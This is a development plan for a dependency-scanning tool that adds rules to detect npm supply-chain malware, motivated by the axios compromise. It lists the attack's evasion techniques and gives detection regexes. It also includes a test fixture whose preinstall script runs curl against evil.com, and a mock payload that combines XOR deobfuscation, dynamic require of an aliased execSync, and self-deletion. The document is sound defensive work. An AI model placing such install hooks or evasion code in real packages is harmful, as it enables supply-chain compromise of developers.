---
title: "feat: Zero-Day Supply Chain Detection Engine"
type: feat
date: 2026-03-31
brainstorm: docs/brainstorms/2026-03-31-zero-day-detection-brainstorm.md
---

# feat: Zero-Day Supply Chain Detection Engine

## Overview

Add 5 new detection rules (P013–P017), fix the AST gate, enhance P002 for cross-line detection, extend P012 to scan dependency `package.json` files, and introduce file-level signal combination scoring. Directly motivated by the axios@1.14.1 supply chain attack (plain-crypto-js) that evaded all existing static analysis.

## Problem Statement

The axios attack used 4 evasion techniques that defeat depsec's current detection:
1. **Dynamic require**: `require(_trans_2(stq[2], ord))` — computed argument, not string literal
2. **Custom obfuscation**: `charCodeAt` + XOR + `String.fromCharCode` — not standard base64
3. **Aliased dangerous functions**: `{ execSync: F }` — called as `F(s)`
4. **Anti-forensic cleanup**: deletes `setup.js`, replaces `package.json` post-execution

Even Datadog's GuardDog (open-source, Semgrep-based) would miss this — they don't detect `require(non_literal)`.

## Implementation Plan

### Phase 1: AST Gate Fix + P013 Dynamic Require

**The single highest-impact change.** Would have caught the axios attack.

#### 1a. Broaden AST Gate (`src/checks/patterns.rs:248-253`)

Current gate only fires AST on files containing literal module names:
```rust
// BEFORE
let needs_ast = AstAnalyzer::can_analyze(path)
    && (content.contains("child_process")
        || content.contains("shelljs")
        || content.contains("execa")
        || content.contains("cross-spawn")
        || content.contains("new Function"));
```

New gate also triggers on dynamic require patterns:
```rust
// AFTER
let needs_ast = AstAnalyzer::can_analyze(path)
    && (content.contains("child_process")
        || content.contains("shelljs")
        || content.contains("execa")
        || content.contains("cross-spawn")
        || content.contains("new Function")
        || content.contains("require(")       // P013: dynamic require
        || content.contains("fromCharCode")   // P014: deobfuscation
        || content.contains("unlinkSync")     // P015: anti-forensic
        || content.contains("rmSync"));       // P015: anti-forensic
```

**Note:** `require(` is extremely common in JS. This broadens AST invocation significantly. However, tree-sitter parsing is fast (~1ms per file) and the gate is a cheap `contains()` check. Worth the tradeoff for P013's detection power.

#### 1b. P013: Dynamic Require Detection (`src/ast/javascript.rs`)

New function `find_dynamic_require()` added to `analyze()`:

**Tree-sitter query:**
```scheme
(call_expression
  function: (identifier) @fn
  arguments: (arguments . (_) @arg)
  (#eq? @fn "require"))
```

**Logic:** For each match, check if `@arg` node kind is NOT `string` or `template_string` (without substitution). If the argument is an identifier, member expression, call expression, or subscript expression → flag as dynamic require.

**Severity classification:**
- `identifier` argument (e.g., `require(x)`) → High
- `call_expression` argument (e.g., `require(decode(s))`) → Critical
- `subscript_expression` (e.g., `require(arr[0])`) → Critical
- `binary_expression` (e.g., `require('./' + x)`) → High
- `template_string` with substitution (e.g., `` require(`${x}`) ``) → High

**Finding format:**
```
rule_id: "DEPSEC-P013"
severity: Critical/High (based on arg type)
confidence: High
message: "Dynamic require() with {arg_type} argument — module name computed at runtime"
suggestion: "Dynamic require() is almost never legitimate in dependencies — this is a strong malware indicator"
```

**Wire into `is_ast_rule()`** (`patterns.rs:417`): add `"DEPSEC-P013"` so regex P001 doesn't double-fire.

**Tests** (`javascript.rs`):
- `test_dynamic_require_variable` — `require(x)` → P013, High
- `test_dynamic_require_function_call` — `require(decode(s))` → P013, Critical
- `test_dynamic_require_subscript` — `require(arr[0])` → P013, Critical
- `test_dynamic_require_concatenation` — `require('./' + x)` → P013, High
- `test_dynamic_require_template` — `` require(`${x}`) `` → P013, High
- `test_static_require_not_flagged` — `require('fs')` → no finding
- `test_static_require_template_not_flagged` — `` require(`fs`) `` → no finding

**Integration test** (`patterns.rs`):
- `test_scan_detects_dynamic_require` — end-to-end via `setup_dep_file`

---

### Phase 2: P014 String Deobfuscation + P017 Obfuscation Indicators

These two are related — P014 detects active deobfuscation code, P017 detects passive obfuscation signatures.

#### 2a. P014: String Deobfuscation Primitives

**Type:** Regex rule in `PATTERN_RULES` array.

```rust
PatternRule {
    rule_id: "DEPSEC-P014",
    name: "String Deobfuscation",
    description: "String.fromCharCode with XOR/bitwise operations — custom deobfuscation routine",
    suggestion: "Legitimate code rarely combines charCodeAt with XOR — this is a strong obfuscation indicator",
    narrative: "...",
    pattern: r"String\.fromCharCode\s*\(.*[\^&|]",
    severity: Severity::High,
    confidence: Confidence::Medium,
}
```

**Additional AST enhancement** (in `javascript.rs`): New function `find_deobfuscation_patterns()`:
- Count `String.fromCharCode` call expressions within each function body
- If ≥3 occurrences in the same function → emit P014 finding with High confidence
- This catches the `_trans_1` function from the axios payload which uses `fromCharCode` in a loop

**Tests:**
- `test_fromcharcode_xor` — `String.fromCharCode(x ^ 333)` → P014
- `test_charcodeat_xor` — `s.charCodeAt(i) ^ key` + `String.fromCharCode(result)` → P014
- `test_normal_fromcharcode_not_flagged` — `String.fromCharCode(65)` → no finding
- `test_dense_fromcharcode_function` — 3+ fromCharCode in one function → P014 (AST, High confidence)

#### 2b. P017: Obfuscation Indicators

**Type:** Regex rule in `PATTERN_RULES` array. Inspired by GuardDog's `npm-obfuscation.yml`.

```rust
PatternRule {
    rule_id: "DEPSEC-P017",
    name: "Code Obfuscation",
    description: "Common obfuscation patterns: hex identifiers, infinite loops, bracket notation",
    suggestion: "Obfuscated code in dependencies is a strong malware indicator — review manually",
    narrative: "...",
    pattern: r"(?:function\s+_0x[a-fA-F0-9]|while\s*\(\s*!!\s*\[\s*\]\s*\)|global\[Buffer\.from\()",
    severity: Severity::High,
    confidence: Confidence::Medium,
}
```

**Additional dedicated function** `check_obfuscation_indicators()` for patterns too complex for a single regex:

1. **Bracket notation API obfuscation** (from GuardDog's 28-pattern set):
   - Regex: `\w+\[["'][a-zA-Z]+["']\]\s*\(` — `module["function"]()`
   - But only flag in deps, not in own code (already scoped to dep dirs)

2. **Code past column 150** (from GuardDog):
   - Check if any non-comment line has content after column 150 that isn't just closing brackets
   - Skip `.min.js` files (already handled by `is_minified` check)

3. **JSFuck patterns** (from GuardDog):
   - Regex: `^[\[\]\(\)\+\!]{10,}$` — 10+ consecutive JSFuck chars on a line

**Tests:**
- `test_hex_function_names` — `function _0x3a2f(...)` → P017
- `test_while_true_obfuscated` — `while (!![])` → P017
- `test_global_buffer_from` — `global[Buffer.from(...)]` → P017
- `test_bracket_notation_api` — `module["require"](x)` → P017
- `test_normal_bracket_not_flagged` — `obj["key"]` (not a call) → no finding
- `test_jsfuck_pattern` — `[][(!![]+[])[+[]]...` → P017

---

### Phase 3: P015 Anti-Forensic Detection

**Type:** Regex rule in `PATTERN_RULES` + dedicated function for complex patterns.

#### 3a. P015 Regex Entry

```rust
PatternRule {
    rule_id: "DEPSEC-P015",
    name: "Anti-Forensic File Operations",
    description: "Self-deleting code or evidence destruction — files delete themselves or replace package.json",
    suggestion: "Self-deleting install scripts are a hallmark of supply chain malware — investigate immediately",
    narrative: "...",
    pattern: r"(?i)(unlinkSync|rmSync)\s*\(.*(__filename|__dirname|setup\.js|package\.json)",
    severity: Severity::Critical,
    confidence: Confidence::High,
}
```

#### 3b. Dedicated Function for Rename-Based Cleanup

`check_anti_forensic()` in `patterns.rs`:
- `renameSync` where source contains `.md` or `.txt` and dest contains `package.json`
- `copyFileSync` targeting `PROGRAMDATA`, `/Library/Caches`, or system temp dirs
- These are multi-token patterns that don't fit cleanly in a single regex

**Tests:**
- `test_unlink_filename` — `fs.unlinkSync(__filename)` → P015
- `test_unlink_setup_js` — `unlinkSync('setup.js')` → P015
- `test_rename_package_json` — `renameSync('package.md', 'package.json')` → P015
- `test_copy_to_programdata` — `copyFileSync(x, process.env.PROGRAMDATA + ...)` → P015
- `test_normal_unlink_not_flagged` — `unlinkSync('temp.log')` → no finding

---

### Phase 4: P016 Dependency Install Scripts

**Type:** Dedicated function extending the existing `check_install_scripts()`.

#### Current P012 Limitation

`check_install_scripts()` (`patterns.rs:539`) only scans `root.join("package.json")` — the project's own package.json. It does NOT scan dependency package.json files.

#### New P016: Scan Dep Package.json Files

New function `check_dep_install_scripts()`:
1. Walk `node_modules/*/package.json` and `node_modules/@*/*/package.json`
2. Parse JSON, extract `scripts.preinstall`, `scripts.postinstall`, `scripts.install`
3. Skip known-safe scripts (extend the existing allowlist from P012):
   ```rust
   const SAFE_INSTALL_SCRIPTS: &[&str] = &[
       "husky install", "husky", "patch-package", "node-gyp rebuild",
       "node-gyp", "tsc", "esbuild", "ngcc", "prisma generate",
       "nuxt prepare", "npx only-allow",
   ];
   ```
4. Flag any remaining install scripts as P016

**Severity:** High (install scripts are the #1 entry vector for supply chain attacks)
**Confidence:** High (the script exists — it's not a pattern match)

**Finding format:**
```
rule_id: "DEPSEC-P016"
message: "Dependency '{pkg_name}' has {hook} script: {script_value}"
suggestion: "Review this install script — install hooks in dependencies are a common attack vector"
```

**Tests:**
- `test_dep_postinstall_flagged` — package with `"postinstall": "node setup.js"` → P016
- `test_dep_safe_script_allowed` — package with `"postinstall": "husky install"` → no finding
- `test_dep_preinstall_flagged` — package with `"preinstall": "curl http://evil.com"` → P016
- `test_no_scripts_no_finding` — package.json without scripts → no finding
- `test_scoped_package_scanned` — `@scope/pkg/package.json` → scanned

---

### Phase 5: P002 Cross-Line Enhancement

**Current P002** regex requires both decode and exec on the same line. The axios payload has them in different functions.

#### New Approach: Same-File Detection

After the line-by-line regex loop, add a file-level check:

```rust
// After all line-by-line patterns are checked, do file-level P002 enhancement
if !ignored_rules.contains(&"DEPSEC-P002") {
    check_cross_line_decode_exec(&content, &rel_path, &mut findings);
}
```

`check_cross_line_decode_exec()`:
1. Check if file contains ANY decode pattern: `Buffer.from(*, "base64")`, `atob(`, `Buffer.from(*, 'base64')`
2. Check if SAME file contains ANY exec sink: `require(`, `eval(`, `exec(`, `new Function(`, `spawn(`
3. If BOTH present → emit finding

**Severity:** High (weaker signal than same-line, stronger than no signal)
**Confidence:** Medium (could be coincidental in large files)

**Only fire if the single-line P002 did NOT already fire** for this file (avoid double-counting).

**Tests:**
- `test_cross_line_buffer_require` — `Buffer.from(x, "base64")` on line 1, `require(y)` on line 5 → P002 (cross-line)
- `test_same_line_p002_no_double` — `atob(x); eval(y)` on same line → only one P002 finding
- `test_large_file_coincidental` — base64 in one function, unrelated require in another → P002 with Medium confidence

---

### Phase 6: Signal Combination Scoring

After all per-file findings are collected, apply **file-level signal boosting**:

New function `apply_signal_combination()` in `patterns.rs`:

```rust
fn apply_signal_combination(findings: &mut Vec<Finding>) {
    // Group findings by file
    let mut by_file: HashMap<String, Vec<&mut Finding>> = HashMap::new();
    // ...group...

    for (file, file_findings) in &mut by_file {
        let rules: HashSet<&str> = file_findings.iter().map(|f| f.rule_id.as_str()).collect();

        // Dynamic require + any obfuscation signal = escalate to Critical
        if rules.contains("DEPSEC-P013") && 
           (rules.contains("DEPSEC-P014") || rules.contains("DEPSEC-P017") || rules.contains("DEPSEC-P007")) {
            for f in file_findings.iter_mut() {
                if f.rule_id == "DEPSEC-P013" {
                    f.severity = Severity::Critical;
                    f.message = format!("{} [ESCALATED: combined with obfuscation signals]", f.message);
                }
            }
        }

        // Install script + shell execution + obfuscation = escalate
        if rules.contains("DEPSEC-P016") && 
           (rules.contains("DEPSEC-P001") || rules.contains("DEPSEC-P013")) {
            // ... escalate P016 findings
        }

        // Anti-forensic + any exec signal = escalate
        if rules.contains("DEPSEC-P015") && rules.iter().any(|r| r.starts_with("DEPSEC-P0")) {
            // ... escalate P015 findings
        }
    }
}
```

**Tests:**
- `test_signal_combination_escalates` — file with P013 + P014 → P013 escalated to Critical
- `test_single_signal_no_escalation` — file with only P013 → stays at original severity
- `test_install_plus_exec_escalates` — file with P016 + P001 → P016 escalated

---

### Phase 7: Housekeeping

1. **Update `list_rules`** in `src/rules.rs:197`:
   ```
   "DEPSEC-P001..P017  Malicious patterns (15 rules)"
   ```

2. **Update `is_ast_rule()`** in `src/checks/patterns.rs:417`:
   ```rust
   fn is_ast_rule(rule_id: &str) -> bool {
       matches!(rule_id, "DEPSEC-P001" | "DEPSEC-P008" | "DEPSEC-P013" | "DEPSEC-P014")
   }
   ```
   P014 only if the AST density check is implemented (otherwise leave as regex-only).

3. **Run full test suite** — `cargo test` must pass with all new tests.

4. **Run `cargo fmt`** and **`cargo clippy`** for CI compliance.

## Acceptance Criteria

### Functional Requirements

- [ ] P013 catches `require(variable)`, `require(func())`, `require(arr[i])` — does NOT flag `require("string")`
- [ ] P014 catches `String.fromCharCode(x ^ y)` and dense `fromCharCode` in functions
- [ ] P015 catches `unlinkSync(__filename)`, `renameSync` package.json replacement
- [ ] P016 scans `node_modules/*/package.json` for install scripts, respects allowlist
- [ ] P017 catches `_0x` hex functions, `while(!![])`, JSFuck, bracket notation API calls
- [ ] P002 cross-line detects `Buffer.from("base64")` + `require()` in same file
- [ ] AST gate triggers on files with `require(`, `fromCharCode`, `unlinkSync`
- [ ] Signal combination escalates P013+P014/P017 to Critical

### Quality Gates

- [ ] All new rules have positive + negative tests
- [ ] All 292+ existing tests still pass
- [ ] `cargo fmt` clean
- [ ] `cargo clippy` clean
- [ ] No false positives on clean jQuery, lodash, express (representative deps)

### Validation Test

- [ ] Create a test file mimicking the axios payload structure and verify depsec flags it:
```javascript
// test_axios_payload.js
const stq = ["longEncodedString1...", "longEncodedString2..."];
function _trans(x, r) {
    let E = x.split("").reverse().join("");
    let S = Buffer.from(E, "base64").toString("utf8");
    return String.fromCharCode(S.charCodeAt(0) ^ 333);
}
const t = require(_trans(stq[0], "key"));
const { execSync: F } = require(_trans(stq[1], "key"));
F(decoded_command);
fs.unlinkSync(__filename);
```
Expected findings: P013 (×2, Critical), P014, P015, P007 (entropy), P002 (cross-line). Signal combination should escalate P013 to Critical with "[ESCALATED]" tag.

## File Changes Summary

| File | Changes |
|------|---------|
| `src/ast/javascript.rs` | Add `find_dynamic_require()`, `find_deobfuscation_patterns()`, tests |
| `src/checks/patterns.rs` | Add P014, P015, P017 to `PATTERN_RULES`. Add `check_dep_install_scripts()`, `check_anti_forensic()`, `check_obfuscation_indicators()`, `check_cross_line_decode_exec()`, `apply_signal_combination()`. Broaden AST gate. Update `is_ast_rule()`. Tests. |
| `src/rules.rs` | Update rule count string in `list_rules()` |

## References

- [Brainstorm](../brainstorms/2026-03-31-zero-day-detection-brainstorm.md)
- [Datadog GuardDog rules](https://github.com/DataDog/guarddog/tree/main/guarddog/analyzer/sourcecode)
- [Socket alert taxonomy](https://socket.dev/npm/issue)
- [OpenSSF package-analysis](https://github.com/ossf/package-analysis)
- [Semgrep taint analysis](https://semgrep.dev/docs/writing-rules/data-flow/taint-mode/overview)
- [axios compromise analysis](https://socket.dev/blog/axios-npm-package-compromised)
